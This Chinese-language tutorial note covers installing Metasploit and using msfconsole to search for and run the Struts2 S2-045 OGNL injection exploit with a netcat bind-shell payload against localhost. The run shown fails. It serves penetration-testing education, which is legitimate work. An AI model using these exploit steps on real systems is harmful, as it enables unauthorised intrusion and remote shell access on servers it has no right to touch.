# MSF
metasploitframework

Metasploit Framework是一个编写，测试和使用exploit代码的完善环境。这个环境为渗透测试，shellcode编写和漏洞研究提供了一个可靠的平台，这个框架主要是由面向对象的Ruby编程语言编写的，并带有由C语言，汇编程序和Python编写的可选组件。


# install
### osx
install from [pkg file](https://osx.metasploit.com/metasploitframework-latest.pkg)

默认文件目录在`/opt/metasploit-framework/bin`下， 会自动在.bash_profile下添加路径，如果使用zsh，需要手动在.zshrc下添加
```
PATH=$PATH:/opt/metasploit-framework/bin
export PATH=$PATH:/opt/metasploit-framework/bin
```


### ubuntu
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```


### tutorial
[tutorial-link](http://blog.csdn.net/u011467044/article/details/53324091)

##### 1. 运行msfconsole
在命令行中输入`msfconsole`。
```
root@ip-172-31-22-56:~# msfconsole

IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v4.16.45-dev-                        ]
+ -- --=[ 1744 exploits - 998 auxiliary - 302 post        ]
+ -- --=[ 529 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf >
```
##### 2. 搜索相关漏洞
以struts2漏洞为例，在msfconsole下使用search搜索关键字。
```
msf > search s2-045

Matching Modules
================

   Name                                          Disclosure Date  Rank       Description
   ----                                          ---------------  ----       -----------
   exploit/multi/http/struts2_content_type_ognl  2017-03-07       excellent  Apache Struts Jakarta Multipart Parser OGNL Injection


msf >
```

##### 3. 选择漏洞模块
根据search返回的结果，使用use指令选择漏洞利用模块，使用show payloads查看可选的漏洞利用脚本。
```
msf > use exploit/multi/http/struts2_content_type_ognl
msf exploit(multi/http/struts2_content_type_ognl) > show payloads

Compatible Payloads
===================

   Name                                                Disclosure Date  Rank    Description
   ----                                                ---------------  ----    -----------
   cmd/unix/bind_awk                                                    normal  Unix Command Shell, Bind TCP (via AWK)
   cmd/unix/bind_inetd                                                  normal  Unix Command Shell, Bind TCP (inetd)
   cmd/unix/bind_lua                                                    normal  Unix Command Shell, Bind TCP (via Lua)
   cmd/unix/bind_netcat                                                 normal  Unix Command Shell, Bind TCP (via netcat)
   cmd/unix/bind_netcat_gaping                                          normal  Unix Command Shell, Bind TCP (via netcat -e)

msf >
```
使用set指令选择payload，输入show options显示需要配置的参数并使用set配置，最后，输入exploit执行渗透：
```
msf exploit(multi/http/struts2_content_type_ognl) > set payload cmd/unix/bind_netcat
payload => cmd/unix/bind_netcat
msf exploit(multi/http/struts2_content_type_ognl) > show options

Module options (exploit/multi/http/struts2_content_type_ognl):

   Name       Current Setting     Required  Description
   ----       ---------------     --------  -----------
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                          yes       The target address
   RPORT      8080                yes       The target port (TCP)
   SSL        false               no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /struts2-showcase/  yes       The path to a struts application action
   VHOST                          no        HTTP server virtual host


Payload options (cmd/unix/bind_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Universal


msf exploit(multi/http/struts2_content_type_ognl) > set RHOST localhost
RHOST => localhost
msf exploit(multi/http/struts2_content_type_ognl) > set RPORT 80
RPORT => 80
msf exploit(multi/http/struts2_content_type_ognl) > exploit

[*] Started bind handler
[-] Exploit aborted due to failure: bad-config: Server returned HTTP 404, please double check TARGETURI
[*] Exploit completed, but no session was created.
msf exploit(multi/http/struts2_content_type_ognl) > 
```
